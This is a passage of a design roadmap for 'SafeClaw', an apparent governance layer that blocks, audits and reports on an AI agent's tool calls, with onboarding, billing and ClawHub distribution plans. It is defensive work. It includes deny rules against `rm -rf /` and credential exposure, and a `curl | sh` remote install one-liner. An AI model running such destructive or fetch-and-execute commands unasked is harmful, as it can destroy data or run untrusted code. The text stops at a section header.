- [ ] Wire up `before_tool_call` hook with basic policy/preference checking
- [ ] Write integration tests: propose actions, verify block/allow decisions

#### 1.4 Audit Trail v1
- [ ] Implement `logger.ts`: append-only JSONL writer
- [ ] Implement `decision-record.ts`: data model for decisions
- [ ] Log every `before_tool_call` decision
- [ ] Log every `llm_input` and `llm_output` (full I/O capture)
- [ ] Basic CLI viewer: `safeclaw audit --last N`

**Deliverable**: A working OpenClaw plugin that blocks tool calls matching policy prohibitions, checks user preferences, and writes an audit log.

---

### Phase 2: Reasoner Integration (Weeks 4-6)

**Goal**: Add the OWL 2 RL reasoner to derive implicit constraints and detect inconsistencies.

#### 2.1 eye-js Integration
- [ ] Implement `reasoner.ts`: wrapper around eye-js WASM engine
- [ ] Write N3 reasoning rules (`safeclaw-rules.n3`):
  - Rule: If action has CriticalRisk AND isReversible=false → requiresConfirmation=true
  - Rule: If action affectsScope SharedState AND user autonomyLevel is "cautious" → requiresConfirmation=true
  - Rule: If action is subclass of ProhibitedAction → block
  - Rule: If dependency constraint exists AND prerequisite not in session history → block
  - Rule: Transitivity rules for action classification (if GitPush is a SharedStateAction, and SharedStateActions require confirmation...)
- [ ] Load lib-owl OWL 2 RL rules alongside custom rules
- [ ] Add reasoner step to the constraint pipeline (Step 5 in Section 5.2)
- [ ] Implement consistency checking: detect if proposed action creates logical contradiction
- [ ] Write tests: verify derived prohibitions, transitive reasoning, consistency detection

#### 2.2 Context Injection
- [ ] Implement `context-builder.ts`: query knowledge graph for session-relevant facts
- [ ] Implement `before_agent_start` hook: inject constraints + facts into system prompt
- [ ] Build natural language serializer for ontology constraints
- [ ] Test: verify LLM receives constraint context and plans around blocks

#### 2.3 Dependency Tracking
- [ ] Implement `dependency-checker.ts`: track actions taken in current session
- [ ] Maintain session action graph (in-memory N3.Store)
- [ ] Query dependency constraints before allowing actions
- [ ] Test: "git push" blocked until "run tests" recorded in session

#### 2.4 Advanced Policy Rules
- [ ] Implement temporal constraints (time-of-day checks)
- [ ] Implement path pattern matching (regex against file paths)
- [ ] Implement command pattern matching (regex against shell commands)
- [ ] Implement rate limiting (max N actions of type X per time window)
- [ ] Add all constraint types to the audit record

**Deliverable**: Full reasoner-in-the-loop. The agent's actions are checked against derived constraints, not just explicit ones. Dependency chains are enforced. The LLM is aware of all active constraints.

---

### Phase 3: Message Governance & Knowledge Feedback (Weeks 7-9)

**Goal**: Gate outgoing messages, feed action results back into the knowledge graph, enable the agent to learn from constraint violations.

#### 3.1 Message Gate
- [ ] Implement `message_sending` hook in `message-gate.ts`
- [ ] Check outgoing messages against communication policies:
  - Never-contact list (user preference)
  - Tone/content policies (domain policy)
  - Sensitive data detection (no secrets in messages)
  - Rate limiting (max messages per time window)
- [ ] Block or modify messages that violate policies
- [ ] Audit log all message decisions

#### 3.2 Knowledge Graph Feedback Loop
- [ ] Implement `after_tool_call` hook to update knowledge graph:
  - Record action outcome (success/failure)
  - Update session fact graph (e.g., "tests passed at 14:32")
  - Track file modifications (which files were changed)
  - Record git state changes (commits, branch changes)
- [ ] Use updated facts in subsequent `before_agent_start` context injection
- [ ] The knowledge graph becomes a live model of the session state

#### 3.3 Violation Learning
- [ ] When the LLM proposes an action that gets blocked:
  - Record the violation pattern
  - In subsequent `before_agent_start`, explicitly remind the LLM about recent violations
  - "Your last action was blocked because: [reason]. Do not retry the same approach."
- [ ] Track violation frequency per constraint — surface problematic patterns
- [ ] Allow policies to be tightened automatically if a constraint is violated repeatedly

#### 3.4 Dynamic Ontology Updates
- [ ] CLI command: `safeclaw policy add --prohibition "pattern" --reason "why"`
- [ ] CLI command: `safeclaw pref set confirmBeforeDelete true`
- [ ] Hot-reload: ontology changes take effect without restart
- [ ] User can add constraints mid-session via natural language (LLM translates to triples)

**Deliverable**: Full closed-loop system. Actions feed back into the knowledge graph. Messages are governed. The agent learns from constraint violations within a session.

---

### Phase 4: Audit Dashboard & Compliance (Weeks 10-12)

**Goal**: Make the audit trail accessible, queryable, and useful for compliance.

#### 4.1 Audit Report Generator
- [ ] Implement `reporter.ts`: generate structured reports from audit logs
- [ ] Markdown report format with sections:
  - Session summary
  - Actions taken (with justifications)
  - Actions blocked (with reasons)
  - Constraints active during session
  - Knowledge graph state at start/end
- [ ] JSON report format for machine consumption
- [ ] CSV export for spreadsheet analysis

#### 4.2 Audit Query CLI
- [ ] `safeclaw audit query "show all blocked file deletions this week"`
- [ ] Natural language → SPARQL translation (use the LLM itself)
- [ ] Filter by: date range, action type, decision, user, session
- [ ] Aggregate statistics: block rate, most-violated constraints, risk distribution

#### 4.3 Interactive Ontology Map (see Section 7.10)
- [ ] Implement `graph_builder.py`: walk owlready2 World → D3-compatible JSON
- [ ] Implement `/api/v1/ontology/graph` endpoint (filterable layers, depth, root node)
- [ ] Implement `/api/v1/ontology/node/{uri}` endpoint (HTMX partial for detail panel)
- [ ] Implement `/api/v1/ontology/search` endpoint (fuzzy search for autocomplete)
- [ ] Build FastHTML page: D3.js force-directed graph with pan, zoom, click, expand
- [ ] Node visual encoding: circles=classes, hexagons=shapes, squares=policies, diamonds=preferences
- [ ] Edge types: subClassOf (solid), objectProperty (dashed), targetClass (dotted orange)
- [ ] Detail panel: click node → properties, SHACL constraints, recent audit decisions
- [ ] Hierarchy tree view as alternative layout
- [ ] Audit heatmap overlay: shade nodes by decision frequency and block rate
- [ ] Filter toggles: show/hide classes, shapes, policies, preferences, session facts
- [ ] Annotate nodes with live audit statistics (total checks, block rate)
- [ ] Real-time updates as the agent acts (SSE or polling for session facts layer)

#### 4.4 Compliance Export
- [ ] Structured compliance report format
- [ ] Maps decisions to policy URIs → traceable to specific governance rules
- [ ] Timestamp, actor, action, decision, justification — complete chain
- [ ] Suitable for SOC 2, ISO 27001, or internal governance review

#### 4.5 Automation Management (Cron & Heartbeat)
- [ ] Gateway cron API proxy: list, create, edit, delete, run jobs via SafeClaw dashboard
- [ ] Cron job list view with governance overlay (which policies apply per job)
- [ ] Visual cron expression builder (preview next 5 runs, timezone picker)
- [ ] Job detail view: run history with SafeClaw decision counts per run
- [ ] Heartbeat status view: interval, active hours, last run, HEARTBEAT.md editor
- [ ] Heartbeat run history: what the agent checked, decisions made, results
- [ ] Governance preview on job creation: show which constraints will apply
- [ ] Scheduled governance reports: daily digest, weekly compliance, violation alerts
- [ ] Violation alert pipeline: real-time webhook on high-severity constraint violations

**Deliverable**: Complete audit, compliance, and automation management system. Every decision is traceable, queryable, and reportable. Cron and heartbeat schedules are visible and manageable from the dashboard.

---

### Phase 5: Remote Service & Hybrid Mode (Weeks 13-16)

**Goal**: Build the SafeClaw central service, the remote engine client, and the hybrid routing layer.

#### 5.1 User & Organization Management (Python)
- [ ] SQLAlchemy data model: Organization, User, OrgMembership, Agent, APIKey (Section 7.8)
- [ ] Alembic migrations for database schema
- [ ] API key authentication (bcrypt hash, scope control)
- [ ] API endpoints: org CRUD, user CRUD, API key management (Section 7.5)
- [ ] Agent registration endpoint + heartbeat
- [ ] Multi-tenant isolation: org_id in every request context
- [ ] Per-org owlready2 World() instances (Section 7.4)
- [ ] Preference inheritance: org → user → agent (Section 7.9)
- [ ] Tests: role-based access, tenant isolation, API key lifecycle

#### 5.2 Authentication & Dashboard Login
- [ ] JWT access + refresh tokens (email + password)
- [ ] OAuth2/OIDC support (Google, Azure AD) — via `authlib`
- [ ] CLI login flow: `safeclaw login` → browser OAuth → local token
- [ ] FastHTML dashboard login page (see Section 7.7)
- [ ] Session management, CSRF protection

#### 5.3 Dashboard UI (FastHTML)
- [ ] Dashboard overview: agents, decisions, top violated constraints (FastHTML + HTMX)
- [ ] Agent list + status (online/offline, last seen)
- [ ] Policy management: CRUD + SHACL shape editor
- [ ] User and role management
- [ ] API key management (create, revoke, rotate)
- [ ] Preferences editor (per-user, per-org defaults)
- [ ] Audit log viewer: filtering, search, detail view
- [ ] Knowledge graph visualization
- [ ] SPARQL query console

#### 5.4 Remote & Hybrid Mode
- [ ] Multi-tenant support for constraint evaluation endpoints
- [ ] Migrate audit storage from SQLite to PostgreSQL
- [ ] Hybrid mode: cached SHACL shapes + remote complex checks
- [ ] Policy sync: agent polls service every 60s (or WebSocket push)
- [ ] Circuit breaker: 3 failures → local-only mode
- [ ] Health check endpoint + Kubernetes readiness probes
- [ ] Docker Compose: SafeClaw + PostgreSQL + (optional) Jena Fuseki
- [ ] Metrics: Prometheus endpoint for latency, block rate, agent count

**Deliverable**: SafeClaw as a complete service: user management, role-based access, multi-tenancy, FastHTML dashboard, agent registration, centralized audit and policy management.

---

### Phase 6: Advanced Reasoning & Scale (Weeks 17-20)

**Goal**: Push the neurosymbolic capabilities further. Handle complex multi-step plans, scale to larger ontologies.

#### 6.1 Plan-Level Reasoning
- [ ] Before the agent executes a multi-step plan, serialize the entire plan as triples
- [ ] Run the reasoner over the whole plan to detect:
  - Constraint violations in later steps
  - Dependency ordering issues
  - Compounding risk (many medium-risk actions = high cumulative risk)
- [ ] Present plan-level assessment to user before execution begins

#### 6.2 Cross-Session Knowledge
- [ ] Persist knowledge graph across sessions (not just within one session)
- [ ] Track: project structure learned, past decisions, preference evolution
- [ ] "Institutional memory": the agent remembers what it learned about your codebase
- [ ] Ontology versioning: track how policies and preferences change over time

#### 6.3 Multi-Agent Governance
- [ ] When OpenClaw spawns sub-agents, propagate constraints to children
- [ ] Each sub-agent operates within the same ontological envelope
- [ ] Audit trail tracks agent hierarchy (which sub-agent did what)
- [ ] Parent agent can set tighter constraints for children

**Deliverable**: Production-ready neurosymbolic governance system with plan-level reasoning, persistent knowledge, and multi-agent support.

---

### Phase 7: Turnkey Product — SafeClaw Cloud (Weeks 21-28)

**Goal**: Package OpenClaw + SafeClaw into a managed product that anyone can sign up for and start using immediately — no installation, no configuration, no terminal.

#### 7.1 Product Vision

The user journey should be:

```
1. Visit safeclaw.ai → "Get Started"
2. Sign up (email or OAuth)
3. Onboarding wizard (3-5 screens):
   - "What will you use the agent for?" → selects policy template
   - "How cautious should the agent be?" → sets autonomy level
   - "Any actions that should always be blocked?" → quick policy setup
4. Dashboard opens → agent is ready
5. Connect via browser, CLI, or API
```

No Docker, no pip install, no config files. Everything is provisioned automatically.

#### 7.2 Architecture: SafeClaw Cloud

```
┌─────────────────────────────────────────────────────────────────┐
│  SafeClaw Cloud (managed infrastructure)                         │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Control Plane                                             │  │
│  │  ├── Sign-up & onboarding (FastHTML)                       │  │
│  │  ├── Billing & subscription (Stripe)                       │  │
│  │  ├── Tenant provisioning (auto-creates org, ontologies,    │  │
│  │  │   default policies, first API key)                      │  │
│  │  └── Usage metering (decisions/month, agents, audit volume)│  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  SafeClaw Service (multi-tenant, same codebase as self-    │  │
│  │  hosted, but managed)                                      │  │
│  │  ├── FastAPI + owlready2 + pySHACL                        │  │
│  │  ├── PostgreSQL (audit, users)                             │  │
│  │  ├── Per-org ontology isolation                            │  │
│  │  └── FastHTML Dashboard                                    │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Managed OpenClaw Instances (optional — "full package")    │  │
│  │  ├── Per-user OpenClaw container (sandboxed)               │  │
│  │  ├── Pre-installed SafeClaw plugin (pre-connected)         │  │
│  │  ├── Browser-based terminal (xterm.js or similar)          │  │
│  │  ├── WebSocket relay for live interaction                  │  │
│  │  └── Persistent workspace storage (per user)               │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

#### 7.3 Two Product Tiers

**Tier 1: "Bring Your Own Agent" (SafeClaw Cloud only)**
- User runs OpenClaw locally or on their own infrastructure
- Signs up at safeclaw.ai → gets API key
- Installs the SafeClaw plugin → points to cloud endpoint
- SafeClaw Cloud handles: governance, audit, dashboard, policies
- User handles: running OpenClaw, their own compute

```
User's machine                    SafeClaw Cloud
┌─────────────┐                  ┌──────────────────┐
│ OpenClaw    │                  │ Governance engine │
│ + SC plugin ├───── HTTPS ────→│ Dashboard         │
│ (local)     │                  │ Audit & policies  │
└─────────────┘                  └──────────────────┘
```

**Tier 2: "Full Package" (Managed OpenClaw + SafeClaw)**
- User signs up → gets a fully managed OpenClaw instance in the cloud
- SafeClaw is pre-installed and pre-connected
- User accesses the agent through a web terminal in the dashboard
- Zero local installation required — works from any browser

```
Browser                          SafeClaw Cloud
┌──────────┐                    ┌──────────────────────────────┐
│ Web       │                   │ ┌──────────────────────────┐ │
│ terminal  ├──── WebSocket ──→ │ │ User's OpenClaw container│ │
│ (xterm.js)│                   │ │ + SafeClaw pre-connected  │ │
└──────────┘                    │ └──────────────────────────┘ │
│ Dashboard │                   │ Governance engine            │
│ (FastHTML) ├──── HTTPS ─────→ │ Audit, policies, ontologies │
└──────────┘                    └──────────────────────────────┘
```

#### 7.4 Onboarding Wizard (FastHTML)

```
Screen 1: "Welcome to SafeClaw"
├── Sign up with email / Google / GitHub
└── Create your organization name

Screen 2: "What does your agent do?"
├── [ ] Software development (code editing, git, terminal)
├── [ ] Data analysis (file processing, API calls)
├── [ ] Research & browsing (web search, content extraction)
├── [ ] Custom → describe your use case
└── Selects appropriate policy template

Screen 3: "How much freedom should the agent have?"
├── ○ Supervised — confirm every significant action
├── ○ Cautious — confirm destructive/irreversible actions (recommended)
├── ○ Autonomous — only block policy violations
└── Sets autonomyLevel + corresponding SHACL shapes

Screen 4: "Quick safety rules"
├── ☑ Never delete files without confirmation
├── ☑ Always run tests before pushing code
├── ☑ Never send messages to external recipients without approval
├── ☐ Block all shell commands (view-only mode)
├── ☐ Custom rule: ________________
└── Creates initial policy triples from selections

Screen 5: "You're ready!"
├── Your API key: sc_live_abc123... (copy to clipboard)
├── Option A: "Install via ClawHub" →
│       clawhub install safeclaw safeclaw-policy-software-dev
│       safeclaw connect --key sc_live_abc123...
├── Option B: "Launch managed agent in browser" → opens web terminal
└── "Open Dashboard" → full dashboard view
```

#### 7.5 Tenant Provisioning Flow

```python
# safeclaw/cloud/provisioning.py

async def provision_tenant(signup: SignupRequest) -> ProvisionResult:
    """
    Called when a new user completes onboarding.
    Creates everything they need in one atomic operation.
    """

    # 1. Create organization
    org = await create_organization(
        name=signup.org_name,
        plan="free",  # or "pro" from billing
    )

    # 2. Create user as owner
    user = await create_user(
        email=signup.email,
        org_id=org.id,
        role="owner",
    )

    # 3. Copy default ontologies into org namespace
    #    Then apply template customizations from onboarding wizard
    await provision_ontologies(
        org_id=org.id,
        template=signup.use_case_template,  # "software-dev", "data-analysis", etc.
        autonomy_level=signup.autonomy_level,
        quick_rules=signup.quick_rules,
    )

    # 4. Generate first API key
    api_key = await create_api_key(
        org_id=org.id,
        created_by=user.id,
        name="default",
        scope="full",
    )

    # 5. (Tier 2 only) Provision managed OpenClaw container
    container = None
    if signup.tier == "full_package":
        container = await provision_openclaw_container(
            org_id=org.id,
            user_id=user.id,
            api_key=api_key.key,
        )

    return ProvisionResult(
        org=org,
        user=user,
        api_key=api_key,
        container=container,
        dashboard_url=f"https://app.safeclaw.ai/orgs/{org.slug}",
    )
```

#### 7.6 Policy Templates

Pre-built ontology + SHACL shape bundles for common use cases:

| Template | Included Policies | Default Autonomy |
|---|---|---|
| **Software Development** | No force-push, tests before push, confirm deletes, no secrets in commits, path-based restrictions | Cautious |
| **Data Analysis** | No external API calls without approval, confirm large file operations, audit all data access | Cautious |
| **Research & Browsing** | Read-only filesystem, no shell commands, web access logging, content filtering | Autonomous |
| **DevOps / Infrastructure** | Strict change management, deployment approval, rollback requirements, blast radius limits | Supervised |
| **Minimal (blank slate)** | Only basic safety: no `rm -rf /`, no credential exposure | Autonomous |

Each template is a directory of `.ttl` files that gets copied into the org's ontology namespace on provisioning.

#### 7.7 Managed OpenClaw Containers (Tier 2)

For users who want the "full package" — no local installation at all:

```
Per-user container spec:
├── Base: Node.js runtime + OpenClaw (latest stable)
├── SafeClaw plugin pre-installed + pre-configured
│   └── SAFECLAW_URL=http://safeclaw-engine:8420  (internal service mesh)
│   └── SAFECLAW_API_KEY=sc_live_...  (pre-provisioned)
├── User workspace: persistent volume (/workspace)
├── Resource limits: CPU, memory, disk (based on plan)
├── Network: outbound internet (filterable), internal to SafeClaw service
├── Access: WebSocket terminal via dashboard (xterm.js)
└── Lifecycle: sleep after 30min idle, wake on reconnect
```

Key decisions:
- **Sandboxing**: Each container runs in its own namespace, no access to other tenants
- **Workspace persistence**: User's project files survive container restarts
- **Container image**: Built from OpenClaw's official image + SafeClaw plugin layer
- **Auto-update**: Containers get new OpenClaw/SafeClaw versions on restart (configurable)

#### 7.8 Billing Model

| Plan | Price | Agents | Decisions/mo | Audit Retention | Features |
|---|---|---|---|---|---|
| **Free** | $0 | 1 | 1,000 | 7 days | Basic policies, local only |
| **Pro** | $29/mo | 5 | 50,000 | 90 days | Custom policies, dashboard, remote mode |
| **Team** | $99/mo | 20 | 500,000 | 1 year | Multi-user, org management, policy templates |
| **Enterprise** | Custom | Unlimited | Unlimited | Custom | Self-hosted option, SSO, SLA, dedicated support |

Managed OpenClaw containers (Tier 2) add:
- **Free**: 1 container, 2 CPU hours/day
- **Pro**: 1 always-on container
- **Team**: 5 containers
- **Enterprise**: Custom

#### 7.9 Implementation Tasks

##### 7.9.1 Cloud Infrastructure
- [ ] Kubernetes cluster setup (managed k8s: GKE, EKS, or similar)
- [ ] SafeClaw service deployment (Helm chart, horizontal pod autoscaling)
- [ ] PostgreSQL managed instance (Cloud SQL / RDS)
- [ ] Container orchestration for managed OpenClaw instances
- [ ] Persistent volume provisioning for user workspaces
- [ ] TLS termination, domain routing (safeclaw.ai, app.safeclaw.ai)
- [ ] CDN for static dashboard assets

##### 7.9.2 Sign-Up & Onboarding
- [ ] Landing page (safeclaw.ai) — FastHTML
- [ ] Sign-up flow: email verification, OAuth providers
- [ ] Onboarding wizard (5 screens, as described in 7.4)
- [ ] Policy template system: load template → customize → provision
- [ ] Tenant provisioning pipeline (Section 7.5)
- [ ] Welcome email with getting-started guide

##### 7.9.3 Billing & Metering
- [ ] Stripe integration: subscriptions, payment methods, invoices
- [ ] Usage metering: count decisions per org per billing cycle
- [ ] Plan enforcement: rate limiting when quota exceeded
- [ ] Upgrade/downgrade flow in dashboard
- [ ] Trial period: 14-day Pro trial on sign-up

##### 7.9.4 Managed OpenClaw Containers
- [ ] Container image: OpenClaw + SafeClaw plugin, auto-configured
- [ ] Container lifecycle: provision, start, sleep, wake, terminate
- [ ] WebSocket terminal relay (xterm.js ↔ container TTY)
- [ ] Workspace persistence (PVC per user)
- [ ] Resource limits enforcement per plan
- [ ] Container health monitoring and auto-restart

##### 7.9.5 Developer Experience
- [ ] `safeclaw connect` CLI command: sign up from terminal, get API key, install plugin
- [ ] One-liner install: `curl -sSL safeclaw.ai/install | sh` (installs plugin + connects to cloud)
- [ ] Documentation site (safeclaw.ai/docs)
- [ ] API reference (auto-generated from FastAPI OpenAPI spec)
- [ ] Example ontology library (community-contributed policy templates)

##### 7.9.6 ClawHub Integration
- [ ] Publish SafeClaw plugin as a ClawHub skill (`clawhub publish`)
- [ ] Users can install SafeClaw with: `clawhub install safeclaw`
- [ ] Publish policy templates as separate ClawHub skills (see Section 7.11)
- [ ] Auto-install policy template skills during onboarding wizard
- [ ] Keep ClawHub skill versions in sync with SafeClaw releases

#### 7.10 ClawHub Distribution Strategy

[ClawHub](https://clawhub.ai) is OpenClaw's public skill registry — the npm of OpenClaw skills. Skills are folders with a `SKILL.md` file, versioned, searchable, and installable via `clawhub install <slug>`. This is the **primary distribution channel** for SafeClaw in the OpenClaw ecosystem.

##### 7.10.1 SafeClaw as a ClawHub Skill

The SafeClaw OpenClaw plugin (the ~50-line TypeScript bridge) is published as a ClawHub skill. This is the simplest install path for existing OpenClaw users:

```bash
# Install SafeClaw into your OpenClaw workspace
clawhub install safeclaw

# That's it. Next OpenClaw session picks it up.
# The skill's SKILL.md tells OpenClaw how to use it.
```

The `safeclaw` ClawHub skill contains:
```
skills/safeclaw/
├── SKILL.md              # Skill description + usage instructions for OpenClaw
├── index.ts              # The TypeScript bridge (HTTP calls to SafeClaw service)
├── package.json          # Plugin manifest
└── setup.sh              # Post-install: checks if SafeClaw service is reachable,
                          #   offers to install Python service or connect to cloud
```

The `SKILL.md` instructs OpenClaw that this skill provides governance hooks, and includes connection instructions for the user.

##### 7.10.2 Policy Templates as ClawHub Skills

Each policy template (Section 7.6) is also published as a standalone ClawHub skill. Users can mix and match governance policies:

```bash
# Browse available policy packs
clawhub search "safeclaw policy"

# Install a policy template
clawhub install safeclaw-policy-software-dev
clawhub install safeclaw-policy-devops
clawhub install safeclaw-policy-data-analysis

# Or install multiple
clawhub install safeclaw-policy-software-dev safeclaw-policy-devops
```

Each policy skill contains:
```
skills/safeclaw-policy-software-dev/
├── SKILL.md                    # Describes what this policy pack governs
├── ontologies/
│   ├── safeclaw-agent.ttl      # Action taxonomy (shared base)
│   ├── safeclaw-policy.ttl     # Software dev specific prohibitions/obligations
│   └── shapes/
│       ├── git-safety.ttl      # No force-push, tests before push
│       ├── file-safety.ttl     # Confirm deletes, no secrets in commits
│       └── shell-safety.ttl    # Dangerous command patterns
└── README.md                   # Human-readable policy description
```

Available policy packs on ClawHub:

| ClawHub Slug | Description |
|---|---|
| `safeclaw` | Core plugin (TypeScript bridge) |
| `safeclaw-policy-software-dev` | Git safety, file protection, test-before-push |
| `safeclaw-policy-devops` | Change management, deployment approval, blast radius limits |
| `safeclaw-policy-data-analysis` | Data access audit, external API approval, large file controls |
| `safeclaw-policy-research` | Read-only filesystem, web logging, content filtering |
| `safeclaw-policy-minimal` | Basic safety only: no `rm -rf /`, no credential exposure |
| `safeclaw-policy-hipaa` | Healthcare compliance: PHI handling, access logging, encryption requirements |
| `safeclaw-policy-fintech` | Financial compliance: transaction approval, audit trail, PII protection |

##### 7.10.3 Community Policy Templates

ClawHub's public nature enables a community ecosystem around SafeClaw policies:

- **Anyone can publish** a policy template as a ClawHub skill
- SafeClaw recognizes skills matching the `safeclaw-policy-*` naming convention
- Community templates are loaded the same way as official ones
- The SafeClaw dashboard shows installed policies with their ClawHub source and version
- `clawhub update --all` keeps policy packs up to date

```bash
# A company publishes their internal compliance rules
clawhub publish ./our-compliance-policy \
  --slug safeclaw-policy-acme-corp \
  --name "ACME Corp Compliance Policy" \
  --version 1.0.0

# Other ACME employees install it
clawhub install safeclaw-policy-acme-corp
```

##### 7.10.4 The "One Button" Install via ClawHub

For the turnkey experience, the install path becomes:

```bash
# Step 1: Install SafeClaw plugin + software dev policies (one command)
clawhub install safeclaw safeclaw-policy-software-dev

# Step 2: Connect to SafeClaw Cloud (or start local service)
safeclaw connect
# → Opens browser → sign up / login → returns API key → writes config

# Step 3: Start OpenClaw. Done.
openclaw
```

Three commands. Or for Tier 2 (full package), zero commands — the managed container comes with the ClawHub skill pre-installed.

##### 7.10.5 ClawHub Skill Versioning & SafeClaw Compatibility

```
safeclaw@1.0.0                    ← Core plugin, compatible with SafeClaw service ≥1.0
safeclaw-policy-software-dev@2.1.0 ← Policy pack, requires safeclaw@≥1.0
safeclaw-policy-devops@1.3.0       ← Policy pack, requires safeclaw@≥1.0
```

- The `SKILL.md` metadata declares compatibility with SafeClaw service versions
- `clawhub update safeclaw` updates the bridge; `clawhub update --all` updates everything
- SafeClaw service validates loaded policy ontology versions on startup

**Deliverable**: A commercially viable product where anyone can sign up, configure their governance preferences through a wizard, and have a fully governed AI agent running within minutes — either connecting their own OpenClaw or using a managed instance in the browser. ClawHub serves as the primary distribution and update channel for the OpenClaw ecosystem, with SafeClaw and its policy packs installable in one command.

---

### 7.12 Automation Management: Cron & Heartbeat

OpenClaw has a built-in automation layer: **cron jobs** (Gateway scheduler for precise timing) and **heartbeat** (periodic awareness loop). SafeClaw governs actions triggered by both, and the dashboard gives full visibility and control over them.

#### 7.12.1 Why This Matters for Governance

Cron-triggered and heartbeat-triggered actions are **autonomous by nature** — they run without the user watching. This makes them the highest-risk actions for governance:

- A cron job running `rm -rf` at 3 AM has no human to intervene
- A heartbeat-triggered email reply happens without the user seeing it first
- Scheduled deploys need the same policy checks as manual ones

SafeClaw treats cron/heartbeat-triggered actions identically to user-triggered ones — every `before_tool_call` still fires, every constraint still applies. But the dashboard adds **visibility and control** over the scheduling itself.

#### 7.12.2 Cron Job Management

The dashboard proxies to OpenClaw's Gateway cron API (`cron.list`, `cron.add`, `cron.update`, `cron.remove`, `cron.run`, `cron.runs`) and adds a governance layer on top.

```
Dashboard: Automation → Cron Jobs
┌──────────────────────────────────────────────────────────────────────┐
│ Cron Jobs                                               [+ New Job] │
├──────────────────────────────────────────────────────────────────────┤
│ Name              │ Schedule       │ Session  │ Status  │ Last Run   │
│───────────────────┼────────────────┼──────────┼─────────┼────────────│
│ Morning briefing  │ 0 7 * * * EST │ Isolated │ Active  │ 2h ago ✓   │
│ Weekly review     │ 0 9 * * 1 EST │ Isolated │ Active  │ 5d ago ✓   │
│ Deploy check      │ */30 * * * *  │ Main     │ Active  │ 12m ago ✓  │
│ DB cleanup        │ 0 3 * * 0     │ Isolated │ Paused  │ 7d ago ✗   │
├──────────────────────────────────────────────────────────────────────┤
│ Click job → detail view                                              │
└──────────────────────────────────────────────────────────────────────┘
```

**Job detail view:**
```
┌──────────────────────────────────────────────────────────────────────┐
│ Morning briefing                           [Edit] [Run Now] [Pause] │
├──────────────────────────────────────────────────────────────────────┤
│ Schedule: 0 7 * * * (America/New_York)                               │
│ Next run: Tomorrow at 7:00 AM EST                                    │
│ Session: Isolated (cron:job-abc123)                                  │
│ Model: opus | Thinking: high                                         │
│ Delivery: announce → Slack #general                                  │
│ Agent: prod-agent-1                                                  │
│                                                                      │
│ Prompt:                                                              │
│ ┌────────────────────────────────────────────────────────────────┐  │
│ │ Summarize overnight updates: email, calendar, project status. │  │
│ └────────────────────────────────────────────────────────────────┘  │
│                                                                      │
│ ── Governance ──────────────────────────────────────────────────── │
│ Policies active during this job's runs:                              │
│  • NeverDeleteWithoutBackup (Prohibition)                            │
│  • MustRunTestsBeforePush (Obligation)                               │
│  • ConfirmExternalMessages (applies to announce delivery)            │
│                                                                      │
│ ── Run History ─────────────────────────────────────────────────── │
│ Run        │ Started          │ Duration │ Result │ Decisions        │
│────────────┼──────────────────┼──────────┼────────┼──────────────────│
│ run-007    │ Today 7:00 AM    │ 45s      │ ✓ OK   │ 12 allow, 0 blk │
│ run-006    │ Yesterday 7:00   │ 52s      │ ✓ OK   │ 14 allow, 1 blk │
│ run-005    │ 2 days ago 7:00  │ 38s      │ ✓ OK   │ 11 allow, 0 blk │
│ Click run → full audit trail for that cron execution                 │
└──────────────────────────────────────────────────────────────────────┘
```

**Create/edit job form** (visual cron builder):
```
┌──────────────────────────────────────────────────────────────────────┐
│ New Cron Job                                                         │
├──────────────────────────────────────────────────────────────────────┤
│ Name: [________________________]                                     │
│                                                                      │
│ Schedule:                                                            │
│  ○ One-shot (at specific time)  [datetime picker]                    │
│  ○ Interval (every N minutes)   [number input] minutes               │
│  ● Cron expression              [* * * * *] Timezone: [dropdown]     │
│                                                                      │
│  Preview: "Runs every day at 7:00 AM Eastern"                        │
│  Next 5 runs: Feb 17 7:00, Feb 18 7:00, Feb 19 7:00, ...           │
│                                                                      │
│ Session: ○ Main (system event)  ● Isolated (dedicated turn)          │
│                                                                      │
│ Prompt / System Event:                                               │
│ ┌────────────────────────────────────────────────────────────────┐  │
│ │                                                                │  │
│ └────────────────────────────────────────────────────────────────┘  │
│                                                                      │
│ Model: [default ▾]  Thinking: [default ▾]  Agent: [default ▾]       │
│                                                                      │
│ Delivery: ○ Announce  ○ Webhook  ○ None                              │
│ Channel: [Slack ▾]  Target: [#general ▾]                             │
│                                                                      │
│ ── Governance Preview ──────────────────────────────────────────── │
│ These SafeClaw policies will apply to actions during this job:        │
│  ✓ NeverDeleteWithoutBackup                                          │
│  ✓ MustRunTestsBeforePush                                            │
│  ⚠ ConfirmExternalMessages (announce delivery = external message)    │
│                                                                      │
│                                        [Cancel]  [Save & Activate]   │
└──────────────────────────────────────────────────────────────────────┘
```

#### 7.12.3 Heartbeat Management

```
Dashboard: Automation → Heartbeat
┌──────────────────────────────────────────────────────────────────────┐
│ Heartbeat Configuration                                   [Edit]     │
├──────────────────────────────────────────────────────────────────────┤
│ Interval: every 30 minutes                                           │
│ Active hours: 08:00 - 22:00 (America/New_York)                      │
│ Target: last (delivers to most recent chat channel)                  │
│ Status: Active — next run in 12 minutes                              │
│                                                                      │
│ ── HEARTBEAT.md (editable) ────────────────────────────────────── │
│ ┌────────────────────────────────────────────────────────────────┐  │
│ │ # Heartbeat checklist                                          │  │
│ │                                                                │  │
│ │ - Check email for urgent messages                              │  │
│ │ - Review calendar for events in next 2 hours                   │  │
│ │ - If a background task finished, summarize results             │  │
│ │ - Check project CI status                                      │  │
│ │ - If idle for 8+ hours, send a brief check-in                 │  │
│ └────────────────────────────────────────────────────────────────┘  │
│                                                      [Save Changes]  │
│                                                                      │
│ ── Recent Heartbeat Runs ─────────────────────────────────────── │
│ Time             │ Result       │ Decisions        │ Actions          │
│──────────────────┼──────────────┼──────────────────┼──────────────────│
│ 12 min ago       │ HEARTBEAT_OK │ 3 allow, 0 blk  │ Checked email ✓  │
│ 42 min ago       │ Delivered    │ 8 allow, 1 blk  │ Sent Slack msg   │
│ 1h 12m ago       │ HEARTBEAT_OK │ 4 allow, 0 blk  │ Nothing urgent   │
│ Click run → full audit trail for that heartbeat cycle                │
└──────────────────────────────────────────────────────────────────────┘
```

#### 7.12.4 Scheduled Governance Reports

